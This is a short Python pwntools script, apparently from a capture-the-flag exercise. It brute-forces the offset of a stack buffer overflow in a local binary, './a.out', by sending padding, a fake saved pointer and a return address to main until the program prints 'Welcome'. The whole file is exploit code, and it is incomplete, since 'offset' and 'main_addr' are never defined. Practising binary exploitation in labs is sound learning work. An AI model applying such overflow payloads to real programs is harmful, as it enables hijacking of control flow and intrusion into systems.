from pwn import *

while True:
    p = process('./a.out')
    #p.recvuntil("How many bytes do you want to send?")
    p.sendline(str(offset))
    payload = ''
    payload += 'a'*0x1010
    payload += p64(0xdeadbeef)
    payload += p64(main_addr)
    payload += 'a'*(offset-len(payload))
    p.send(payload)
    temp = p.recvall()
    if "Welcome" in temp:
        p.close()
        break
    else:
        offset += 1
        p.close()
